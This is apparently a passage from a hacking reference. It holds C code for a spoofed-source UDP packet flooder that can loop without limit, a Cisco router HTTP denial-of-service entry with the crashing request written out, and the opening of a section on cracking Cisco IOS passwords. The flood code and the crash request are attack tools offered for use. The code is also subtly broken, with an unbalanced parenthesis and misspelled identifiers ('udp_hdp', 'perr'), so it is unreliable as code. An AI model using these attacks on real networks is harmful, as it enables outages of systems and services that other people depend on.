```
ip->ip_v = 4;
ip->ip_hl = 5;
ip->ip_ttl = 255;
ip->ip_p = IPPROTO_UDP;
ip->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + psize);
ip->ip_sum = in_cksum(ip, sizeof(struct ip));
udp->uh_sport = htons(srcport);
udp->uh_dport = htons(dstport);
udp->uh_ulen = htons(sizeof(struct udphdr) + psize);
for (i=0; i<numpacks; (unlim) ? i++, i-- : i++)
{
    if (!srchost)
    {
        ip->ip_src.s_addr = (unsigned long)rand());
        syslog( LOG_NOTICE, "IP source set randomly.");
    }
    if (sendto (send, packet, sizeof(struct ip) + sizeof(struct udp_hdp) + psize, 0, (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in)) == (-1))
    {
        puts( "[*] Error sending packet." );
        perr( "Sendpacket" );
        exit(EXIT_FAILURE); 
    }
    usleep(wait);
}
syslog( LOG_NOTICE, "Sent %d packets to [%s]", numpacks, target );
}
```

# HTTP DoS Attack

**Synopsis:** There is an HTTP DoS vulnerability in Cisco family access products.

**Hack State:** Unauthorized access and/or system crash.

**Vulnerabilities:** Access routers.

**Breach:** Cisco routers have a built-in feature that allows administrators to monitor them remotely. When this feature is enabled, it is possible to cause an HTTP DoS attack against the router by issuing a simple request. This request will cause the router to stop responding until the unit is reset:

```
http:///%%
```

# IOS Password Cracker

**Synopsis:** There is potential exposure of Cisco internetworking operating system (IOS) passwords.

**Hack State:** Password crack.

**Vulnerabilities:** Access routers.